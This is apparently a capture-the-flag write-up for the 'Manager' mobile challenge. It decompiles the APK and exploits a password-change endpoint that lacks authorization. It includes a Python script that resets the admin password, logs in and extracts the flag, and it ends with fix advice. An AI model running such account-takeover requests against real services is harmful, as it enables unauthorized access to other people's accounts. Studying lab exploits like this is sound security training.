## Overview

**Manager** is an Easy Mobile challenge. The provided `Manager.apk` is just a front-end for
an ordinary HTTP backend — the real bug is server-side. Decompiling the app shows a
password-management API where the "change password" endpoint performs **no authorization
check**, so anyone can reset the `admin` account's password, log in, and read the flag
straight out of the admin record. It's
[missing authorization](https://cwe.mitre.org/data/definitions/862.html)
([CWE-862](https://cwe.mitre.org/data/definitions/862.html)) leading to account takeover.

## The technique

Don't run the APK in an emulator — read its API. Decompile with **jadx** (a standalone
download, no root required):

```bash
jadx -d out Manager.apk
```

The app package `com.example.manager` documents every endpoint:

- `MainActivity` builds the base URL `http://<ip>:<port>/` from user input.
- `LoginActivity` / `RegisterActivity` POST `username=&password=` to `login.php` /
  `register.php`, which return JSON `{id, username, password, role}`.
- `EditActivity.update()` POSTs `username=&password=` to `manage.php` to change a password.

The decompiled `update()` makes the bug obvious — it sends a username and a new password and
nothing else; there is no token, cookie, or identity tied to the request:

```java
String str  = this.url + "manage.php";
String body = "username=" + this.tvUsername.getText() + "&password=" + this.etPassword.getText();
// ... POST body, no Authorization header, no session
```

So `manage.php` will change **any** account's password — including `admin`.

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, urllib.request, urllib.parse, json
base = sys.argv[1].rstrip('/')

def post(path, **form):
    req = urllib.request.Request(f'{base}/{path}',
        data=urllib.parse.urlencode(form).encode(),
        headers={'User-Agent': 'Mozilla/5.0'})
    return urllib.request.urlopen(req, timeout=12).read().decode()

# 1) broken access control: overwrite admin's password (no auth needed)
print(post('manage.php', username='admin', password='pwned123'))
# 2) log in as admin and read the flag from the `role` field
resp = post('login.php', username='admin', password='pwned123')
print('FLAG:', json.loads(resp)['role'])
```

Run it against the live instance:

```bash
python3 solve.py http://<host>:<port>
# Password updated successfully.
# FLAG: HTB{...}
```

The response is `{"id":1,"username":"admin","password":"pwned123","role":"HTB{...}"}` — the
flag is hidden in the admin user's `role` field.

## Why it worked

The server trusted the mobile client to "only manage its own account," but a request is just
a request. Nothing on the backend verified *who* was making the call before letting it
overwrite the admin's password. Once you control the admin password you log in normally and
the admin record hands you everything it holds.

## Fix / defense

- Require an authenticated session and authorize server-side: a user may change **only their
  own** password (`session_user == target_user`).
- Never return secrets to clients in a field like `role`.
- Treat the mobile client as fully untrusted — all access control belongs on the server.
